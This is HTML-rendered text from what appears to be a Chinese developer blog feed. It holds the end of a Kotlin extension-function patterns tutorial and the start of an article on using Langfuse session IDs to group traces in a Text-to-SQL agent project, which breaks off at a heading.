<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">isEven</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> = <span class="hljs-keyword">this</span> % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">isOdd</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> = !isEven()

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-keyword">val</span> number = <span class="hljs-number">1234567</span>
<span class="hljs-keyword">val</span> formatted = number.formatWithCommas() <span class="hljs-comment">// 结果: "1,234,567"</span>

<span class="hljs-keyword">val</span> price = <span class="hljs-number">49.99</span>
<span class="hljs-keyword">val</span> display = price.formatAsPrice() <span class="hljs-comment">// 结果: "$49.99"</span>

<span class="hljs-keyword">val</span> value = <span class="hljs-number">3.14159f</span>
<span class="hljs-keyword">val</span> rounded = value.roundTo(<span class="hljs-number">2</span>) <span class="hljs-comment">// 结果: 3.14f</span>

<span class="hljs-keyword">val</span> flag = <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> (flag.toBoolean()) {
    <span class="hljs-comment">// 执行逻辑</span>
}
</code></pre>
<h4 data-id="heading-21">范围与边界扩展</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">clamp</span><span class="hljs-params">(min: <span class="hljs-type">Int</span>, max: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> {
        <span class="hljs-keyword">this</span> &lt; min -&gt; min
        <span class="hljs-keyword">this</span> &gt; max -&gt; max
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-keyword">this</span>
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Float</span>.<span class="hljs-title">clamp</span><span class="hljs-params">(min: <span class="hljs-type">Float</span>, max: <span class="hljs-type">Float</span>)</span></span>: <span class="hljs-built_in">Float</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> {
        <span class="hljs-keyword">this</span> &lt; min -&gt; min
        <span class="hljs-keyword">this</span> &gt; max -&gt; max
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-keyword">this</span>
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">inRange</span><span class="hljs-params">(range: <span class="hljs-type">IntRange</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span> <span class="hljs-keyword">in</span> range
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">toPercentage</span><span class="hljs-params">(total: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Float</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (total == <span class="hljs-number">0</span>) <span class="hljs-number">0f</span> <span class="hljs-keyword">else</span> (<span class="hljs-keyword">this</span>.toFloat() / total) * <span class="hljs-number">100</span>
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-keyword">val</span> value = <span class="hljs-number">150</span>
<span class="hljs-keyword">val</span> clamped = value.clamp(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>) <span class="hljs-comment">// 结果: 100</span>

<span class="hljs-keyword">val</span> progress = <span class="hljs-number">75</span>
<span class="hljs-keyword">if</span> (progress.inRange(<span class="hljs-number">50.</span><span class="hljs-number">.100</span>)) {
    println(<span class="hljs-string">"进度过半"</span>)
}

<span class="hljs-keyword">val</span> completed = <span class="hljs-number">30</span>
<span class="hljs-keyword">val</span> total = <span class="hljs-number">100</span>
<span class="hljs-keyword">val</span> percentage = completed.toPercentage(total) <span class="hljs-comment">// 结果: 30.0</span>
</code></pre>
<hr/>
<h3 data-id="heading-22">模式 9：Flow 与 LiveData 扩展 (Flow and LiveData Extensions)</h3>
<p><strong>问题：</strong> Flow 和 LiveData 的操作过于繁琐。</p>
<h4 data-id="heading-23">Flow 扩展</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">throttleFirst</span><span class="hljs-params">(windowDuration: <span class="hljs-type">Long</span>)</span></span>: Flow&lt;T&gt; = flow {
    <span class="hljs-keyword">var</span> lastEmissionTime = <span class="hljs-number">0L</span>
    collect { value -&gt;
        <span class="hljs-keyword">val</span> currentTime = System.currentTimeMillis()
        <span class="hljs-keyword">if</span> (currentTime - lastEmissionTime &gt;= windowDuration) {
            lastEmissionTime = currentTime
            emit(value)
        }
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;List&lt;T&gt;</span>&gt;.<span class="hljs-title">filterNotEmpty</span><span class="hljs-params">()</span></span>: Flow&lt;List&lt;T&gt;&gt; {
    <span class="hljs-keyword">return</span> filter { it.isNotEmpty() }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T?&gt;</span>.<span class="hljs-title">filterNotNull</span><span class="hljs-params">()</span></span>: Flow&lt;T&gt; {
    <span class="hljs-keyword">return</span> mapNotNull { it }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">onEachDebounce</span><span class="hljs-params">(timeoutMillis: <span class="hljs-type">Long</span>, action: <span class="hljs-type">suspend</span> (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span>: Flow&lt;T&gt; {
    <span class="hljs-keyword">return</span> debounce(timeoutMillis).onEach { action(it) }
}

<span class="hljs-comment">// 用法示例</span>
searchQueryFlow
    .debounce(<span class="hljs-number">300</span>) <span class="hljs-comment">// 防抖</span>
    .filterNotNull()
    .collect { query -&gt;
        performSearch(query)
    }

clickFlow
    .throttleFirst(<span class="hljs-number">1000</span>) <span class="hljs-comment">// 节流，防止连续点击</span>
    .collect {
        handleClick()
    }

itemsFlow
    .filterNotEmpty()
    .collect { items -&gt;
        displayItems(items)
    }
</code></pre>
<h4 data-id="heading-24">LiveData 扩展函数</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> LiveData<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">observeOnce</span><span class="hljs-params">(owner: <span class="hljs-type">LifecycleOwner</span>, observer: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span> {
    observe(owner, <span class="hljs-keyword">object</span> : Observer&lt;T&gt; {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onChanged</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span> {
            observer(value)
            removeObserver(<span class="hljs-keyword">this</span>)
        }
    })
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> LiveData<span class="hljs-type">&lt;T?&gt;</span>.<span class="hljs-title">filterNotNull</span><span class="hljs-params">()</span></span>: LiveData&lt;T&gt; {
    <span class="hljs-keyword">return</span> map { it }.filter { it != <span class="hljs-literal">null</span> } <span class="hljs-keyword">as</span> LiveData&lt;T&gt;
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;X, Y&gt;</span> LiveData<span class="hljs-type">&lt;X&gt;</span>.<span class="hljs-title">map</span><span class="hljs-params">(transform: (<span class="hljs-type">X</span>) -&gt; <span class="hljs-type">Y</span>)</span></span>: LiveData&lt;Y&gt; {
    <span class="hljs-keyword">return</span> Transformations.map(<span class="hljs-keyword">this</span>, transform)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;X, Y&gt;</span> LiveData<span class="hljs-type">&lt;X&gt;</span>.<span class="hljs-title">switchMap</span><span class="hljs-params">(transform: (<span class="hljs-type">X</span>) -&gt; <span class="hljs-type">LiveData</span>&lt;<span class="hljs-type">Y</span>&gt;)</span></span>: LiveData&lt;Y&gt; {
    <span class="hljs-keyword">return</span> Transformations.switchMap(<span class="hljs-keyword">this</span>, transform)
}

<span class="hljs-comment">// 用法示例</span>
userLiveData.observeOnce(viewLifecycleOwner) { user -&gt;
    initializeUser(user) <span class="hljs-comment">// 仅观察一次</span>
}

<span class="hljs-keyword">val</span> userNameLiveData = userLiveData
    .filterNotNull()
    .map { it.name }
</code></pre>
<hr/>
<h3 data-id="heading-25">模式 10：Intent 与 Bundle 扩展 (Intent and Bundle Extensions)</h3>
<p><strong>问题：</strong> Intent 的创建和 Bundle 的操作代码过于繁琐。</p>
<h4 data-id="heading-26">Intent 扩展函数</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T : Activity&gt;</span> Context.<span class="hljs-title">startActivity</span><span class="hljs-params">(
    options: <span class="hljs-type">Bundle</span>? = <span class="hljs-literal">null</span>,
    <span class="hljs-keyword">init</span>: <span class="hljs-type">Intent</span>.() -&gt; <span class="hljs-type">Unit</span> = {}
)</span></span> {
    <span class="hljs-keyword">val</span> intent = Intent(<span class="hljs-keyword">this</span>, T::<span class="hljs-keyword">class</span>.java)
    intent.<span class="hljs-keyword">init</span>()
    startActivity(intent, options)
}

<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T : Activity&gt;</span> Context.<span class="hljs-title">startActivityWithExtras</span><span class="hljs-params">(
    <span class="hljs-keyword">vararg</span> params: <span class="hljs-type">Pair</span>&lt;<span class="hljs-type">String</span>, Any?&gt;
)</span></span> {
    <span class="hljs-keyword">val</span> intent = Intent(<span class="hljs-keyword">this</span>, T::<span class="hljs-keyword">class</span>.java)
    params.forEach { (key, value) -&gt;
        <span class="hljs-keyword">when</span> (value) {
            <span class="hljs-keyword">is</span> String -&gt; intent.putExtra(key, value)
            <span class="hljs-keyword">is</span> <span class="hljs-built_in">Int</span> -&gt; intent.putExtra(key, value)
            <span class="hljs-keyword">is</span> <span class="hljs-built_in">Boolean</span> -&gt; intent.putExtra(key, value)
            <span class="hljs-keyword">is</span> Parcelable -&gt; intent.putExtra(key, value)
            <span class="hljs-keyword">is</span> Serializable -&gt; intent.putExtra(key, value)
        }
    }
    startActivity(intent)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Intent.<span class="hljs-title">clearStack</span><span class="hljs-params">()</span></span> {
    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
}

<span class="hljs-comment">// 用法示例</span>
startActivity&lt;ProfileActivity&gt; {
    putExtra(<span class="hljs-string">"userId"</span>, userId)
    putExtra(<span class="hljs-string">"userName"</span>, userName)
}

startActivityWithExtras&lt;DetailActivity&gt;(
    <span class="hljs-string">"itemId"</span> to itemId,
    <span class="hljs-string">"showComments"</span> to <span class="hljs-literal">true</span>
)

<span class="hljs-keyword">val</span> intent = Intent(<span class="hljs-keyword">this</span>, MainActivity::<span class="hljs-keyword">class</span>.java)
intent.clearStack()
startActivity(intent)
</code></pre>
<h4 data-id="heading-27">Bundle 扩展函数</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T : Parcelable&gt;</span> Bundle.<span class="hljs-title">getParcelableCompat</span><span class="hljs-params">(key: <span class="hljs-type">String</span>)</span></span>: T? {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.TIRAMISU) {
        getParcelable(key, T::<span class="hljs-keyword">class</span>.java)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-meta">@Suppress(<span class="hljs-string">"DEPRECATION"</span>)</span>
        getParcelable(key)
    }
}

<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T : Serializable&gt;</span> Bundle.<span class="hljs-title">getSerializableCompat</span><span class="hljs-params">(key: <span class="hljs-type">String</span>)</span></span>: T? {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.TIRAMISU) {
        getSerializable(key, T::<span class="hljs-keyword">class</span>.java)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-meta">@Suppress(<span class="hljs-string">"DEPRECATION"</span>)</span>
        getSerializable(key) <span class="hljs-keyword">as</span>? T
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">bundleOf</span><span class="hljs-params">(<span class="hljs-keyword">vararg</span> pairs: <span class="hljs-type">Pair</span>&lt;<span class="hljs-type">String</span>, Any?&gt;)</span></span>: Bundle {
    <span class="hljs-keyword">return</span> Bundle().apply {
        pairs.forEach { (key, value) -&gt;
            <span class="hljs-keyword">when</span> (value) {
                <span class="hljs-keyword">is</span> String -&gt; putString(key, value)
                <span class="hljs-keyword">is</span> <span class="hljs-built_in">Int</span> -&gt; putInt(key, value)
                <span class="hljs-keyword">is</span> <span class="hljs-built_in">Boolean</span> -&gt; putBoolean(key, value)
                <span class="hljs-keyword">is</span> Parcelable -&gt; putParcelable(key, value)
                <span class="hljs-keyword">is</span> Serializable -&gt; putSerializable(key, value)
            }
        }
    }
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-keyword">val</span> bundle = bundleOf(
    <span class="hljs-string">"userId"</span> to <span class="hljs-number">123</span>,
    <span class="hljs-string">"userName"</span> to <span class="hljs-string">"John"</span>,
    <span class="hljs-string">"isPremium"</span> to <span class="hljs-literal">true</span>
)

<span class="hljs-keyword">val</span> user: User? = arguments?.getParcelableCompat(<span class="hljs-string">"user"</span>)
<span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span>: MyData? = savedInstanceState?.getSerializableCompat(<span class="hljs-string">"data"</span>)
</code></pre>
<hr/>
<p>扩展函数将重复的代码转化为简洁且具表现力的 API。从这十种模式开始尝试，你将见证你的代码库变得更加易于维护。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Agent开发应知应会(Langfuse)：Langfuse Session概念详解和实战应用]]></title>    <link>https://juejin.cn/post/7605807405307625535</link>    <guid>https://juejin.cn/post/7605807405307625535</guid>    <pubDate>2026-02-13T03:27:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605807405307625535" data-draft-id="7605941424535978038" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Agent开发应知应会(Langfuse)：Langfuse Session概念详解和实战应用"/> <meta itemprop="keywords" content="人工智能,Python,LLM"/> <meta itemprop="datePublished" content="2026-02-13T03:27:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="zaizaizhao"/> <meta itemprop="url" content="https://juejin.cn/user/906425682113933"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Agent开发应知应会(Langfuse)：Langfuse Session概念详解和实战应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/906425682113933/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    zaizaizhao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T03:27:22.000Z" title="Fri Feb 13 2026 03:27:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>最近在做一个 Text-to-SQL 的 Agent 项目 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzaizaizhao%2Feasysql" target="_blank" title="https://github.com/zaizaizhao/easysql" ref="nofollow noopener noreferrer">EasySQL</a>，这篇文章就把我langfuse的session使用整理一下，代码都是从项目里直接搬的，欢迎大佬们高抬贵手点点star，共建、交流。</p>
</blockquote>
<h3 data-id="heading-0">Langfuse官方文档的原文定义</h3>
<blockquote>
<p>Many interactions with LLM applications span multiple traces and observations. Sessions in Langfuse are a special way to group these observations across traces together and see a simple session replay of the entire interaction.
Optionally, traces can be grouped into sessions. Sessions are used to group traces that are part of the same user interaction. A common example is a thread in a chat interface.</p>
</blockquote>
<p>翻译一下：一次用户与 LLM 应用的交互往往不只一个请求。比如用户在聊天界面中连续问了 3 个问题，每个问题是一个独立的 Trace（一次完整的 LLM调用链路），但它们属于同一次会话。Session 就是把这些相关的 Trace 归到一组。</p>
<h5 data-id="heading-1">Session</h5>





















<table><thead><tr><th>session_id 格式</th><th>任意 US-ASCII 字符串，小于 200 字符</th></tr></thead><tbody><tr><td>归组逻辑</td><td>所有携带相同 session_id 的 Trace 自动归入同一个 Session</td></tr><tr><td>创建时机</td><td>无需显式创建 Session 对象，第一个携带该 session_id 的 Trace 出现时自动创建</td></tr><tr><td>Trace 的关系</td><td>一个 Session 包含多个 Trace，一个 Trace 只属于一个 Session</td></tr></tbody></table>
<h3 data-id="heading-2">项目举例</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55cf9fda7f0e4c008d4e55c9059cbbba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgemFpemFpemhhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771558042&amp;x-signature=%2FxdHKHN1MMoZ5hOExF9FK8UQwCw%3D" alt="image.png" loading="lazy"/></p>
<p>没有Session时：这两个Trace（一个会话中的两个问答） 在Langfuse Dashboard中是散落的，你不知道它们之间有关联。有Session时：点进某个Session，能看到完整的多次对话回放——用户从第1个问题到第3个问题的完整链路。</p>
<h5 data-id="heading-3">无session的情况下，所有的trace都集中展示无法筛选</h5>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca5242ec11bb449285ce93e36d0543f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgemFpemFpemhhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771558042&amp;x-signature=uT22W6CeJDMHnJDVYAu5P%2FlAXJM%3D" alt="image.png" loading="lazy"/></p>
<p>有session的情况，可以根据session展示，我这里就可以通过同个session来观察第二个问题有没有取得第一个问题的历史对话上下文，由此来判断代码中的处理是否合理</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c964b022d921418ca5729b12c8fbbb9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgemFpemFpemhhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771558042&amp;x-signature=kGqmnZzZvjsOHWVthFLpIg5RaiY%3D" alt="image.png" loading="lazy"/></p>
<p>也可以在Dashboards中筛选</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea47731103534a73ad8db86c288ad898~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgemFpemFpemhhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771558042&amp;x-signature=SfbNp6%2B4JCaWmxXav2h6kH060mk%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-4">代码实现</h4>
<p>核心代码在 query_service.py。也就是创建一个会话session id的地方，由于项目中已经设置了session id来区分不同的会话，所以这里可以直接复用，保证langfuse中的session id和数据库中的会话session id一致。这样做的好处是：当在 Langfuse Dashboard 中看到某个Session 有问题时，可以直接用这个 ID 去业务数据库中查对应的会话记录，两边的 ID 是一致的。（这也是我认为最重要的一点）</p>
<pre><code class="hljs language-python" lang="python">  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_make_config</span>(<span class="hljs-params">self, session_id: <span class="hljs-built_in">str</span>, thread_id: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span></span>) -&gt; RunnableConfig:
      effective_thread_id = thread_id <span class="hljs-keyword">or</span> session_id
      config: RunnableConfig = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: effective_thread_id}}
      <span class="hljs-keyword">if</span> self.callbacks:
          config[<span class="hljs-string">"callbacks"</span>] = self.callbacks
          config[<span class="hljs-string">"metadata"</span>] = {                          <span class="hljs-comment"># ← 关键</span>
              <span class="hljs-string">"langfuse_session_id"</span>: session_id,          <span class="hljs-comment"># ← Session 隔离</span>
              <span class="hljs-string">"langfuse_tags"</span>: [<span class="hljs-string">"text2sql"</span>],              <span class="hljs-comment"># ← 标签</span>
          }
          logger.debug(<span class="hljs-string">f"LangFuse callbacks attached: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(self.callbacks)}</span> handler(s)"</span>)
      <span class="hljs-keyword">return</span> config
</code></pre>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> self.graph.astream(
        input_state,
        self._make_config(session.session_id, effective_thread_id),
        stream_mode=[<span class="hljs-string">"updates"</span>, <span class="hljs-string">"custom"</span>],
    ):
</code></pre>
<p>工作原理</p>
<p>这里用的是 Langfuse 官方推荐的 metadata 传参方式。官方文档原文：</p>
<blockquote>
<p>With the Python SDK, you can set trace attributes dynamically via metadata fields in chain invocation by passing a config dictionary.This is the simplest approach for adding trace context to your LangChain executions without additional setup.</p>
</blockquote>
<p>官方示例：</p>
<pre><code class="hljs language-python" lang="python"> response = chain.invoke(
      {<span class="hljs-string">"topic"</span>: <span class="hljs-string">"cats"</span>},
      config={
          <span class="hljs-string">"callbacks"</span>: [langfuse_handler],
          <span class="hljs-string">"metadata"</span>: {
              <span class="hljs-string">"langfuse_user_id"</span>: <span class="hljs-string">"random-user"</span>,
              <span class="hljs-string">"langfuse_session_id"</span>: <span class="hljs-string">"random-session"</span>,     
              <span class="hljs-string">"langfuse_tags"</span>: [<span class="hljs-string">"random-tag-1"</span>, <span class="hljs-string">"random-tag-2"</span>] 
          }
      }
  )
</code></pre>
<h3 data-id="heading-5">Session带来的监控意义</h3>
<h5 data-id="heading-6">Session 级别的聚合分析</h5>

























<table><thead><tr><th>每个 Session 的 Trace 数量</th><th>用户平均问几轮才完成任务</th><th>** 轮次多 = 可能需要优化追问体验**</th></tr></thead><tbody><tr><td>每个 Session 的 总 Token</td><td>一次完整交互的总消耗</td><td>评估单次用户交互的成本</td></tr><tr><td>每个 Session 的 总延迟</td><td>用户完成任务的总等待时间</td><td>评估端到端的用户体验</td></tr><tr><td>每个 Session 的 失败 Trace 比例</td><td>多轮中有几轮出错</td><td>定位哪些类型的追问容易失败</td></tr></tbody></table>
<h5 data-id="heading-7">对比没有session</h5>






























